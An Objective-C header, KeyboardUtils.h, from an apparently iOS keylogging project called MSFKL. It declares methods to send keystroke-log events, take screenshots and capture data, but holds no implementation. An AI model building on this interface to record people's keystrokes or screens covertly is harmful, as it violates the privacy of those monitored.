//
//  KeyboardUtils.h
//  MSFKL
//
//  Created by Ophat Phuetkasickonphasutha on 9/4/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import <Foundation/Foundation.h>
#import <UIKit/UIKit.h>
#import "FxEventEnums.h"

@class FxKeyLogEvent;

@interface KeyboardUtils : NSObject {

	NSString * mCharacter;
	NSString * mRawCharacter;
	
	NSTimer * mCountDown;
}
@property (nonatomic, copy) NSString * mCharacter;
@property (nonatomic, copy) NSString * mRawCharacter;
@property (nonatomic, assign) NSTimer * mCountDown;
+ (id) sharedKeyboardUtils;
+ (void) sendKeyboardEvent: (FxKeyLogEvent *) aIMEvent;
- (UIImage *) takeScreenShot ;
- (void) CaptureData;

@end
